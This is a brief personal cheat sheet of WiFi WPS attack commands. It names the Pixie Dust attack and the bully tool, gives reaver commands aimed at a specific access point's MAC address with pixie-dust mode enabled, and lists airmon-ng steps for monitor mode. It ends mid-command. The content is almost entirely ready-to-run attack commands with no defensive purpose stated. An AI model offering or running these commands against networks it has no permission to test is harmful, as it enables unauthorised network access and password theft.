# Pixie Reaver attack
exploits a math problem in WPS
# bully
bully does the fake auth, then when password is shared with you it prints it to the terminal
sudo reaver -i wlx00c0cab46234 -b 74:DA:88:59:96:A9 -c 10 -K -S -vvv | tee output.txt
sudo reaver -i wlan0mon -b 74:DA:88:59:96:A9 -c 5 -K -S -vvv

#switchin your wlan to monitor mode
sudo ifconfig wlx00c0cab40201 down # down the interface
sudo airmon
sudo airmon-ng start wlx00c0cab46234
sudo wash -i 